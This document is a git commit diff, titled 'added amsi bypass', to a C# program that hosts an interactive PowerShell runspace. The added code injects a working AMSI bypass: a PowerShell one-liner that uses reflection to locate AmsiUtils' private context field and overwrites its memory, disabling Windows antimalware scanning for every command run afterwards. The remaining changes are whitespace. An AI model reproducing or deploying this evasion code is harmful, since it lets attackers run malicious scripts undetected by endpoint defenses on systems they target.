346ac6684cfe61a67ff49795b1f6289dd741ef91
superhac <superhac@users.noreply.github.com>
2021-11-11 08:10:00 -0600

    added amsi bypass

--- InteractiveRunspace.cs
+++ InteractiveRunspace.cs
@@ -17,21 +17,25 @@ namespace InteractiveRunspace
             rs.Open();
             ps.Runspace = rs;
 
+            // disable amsi
+            ps.AddScript(@"$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "" * iUtils"") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "" * Context"") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)");
+            ps.Invoke();
+
             while (true)
             {
-                Console.Write("PS "+Directory.GetCurrentDirectory()+">");
+                Console.Write("PS " + Directory.GetCurrentDirectory() + ">");
                 cmd = Console.ReadLine();
-                
+
                 if (String.Equals(cmd, "exit"))
                     break;
 
                 Pipeline pipeline = rs.CreatePipeline();
                 pipeline.Commands.AddScript(cmd);
-               
+
                 pipeline.Commands.Add("Out-String");
                 Collection<PSObject> results = pipeline.Invoke();
                 StringBuilder stringBuilder = new StringBuilder();
-                
+
                 foreach (PSObject obj in results)
                 {
                     stringBuilder.Append(obj);
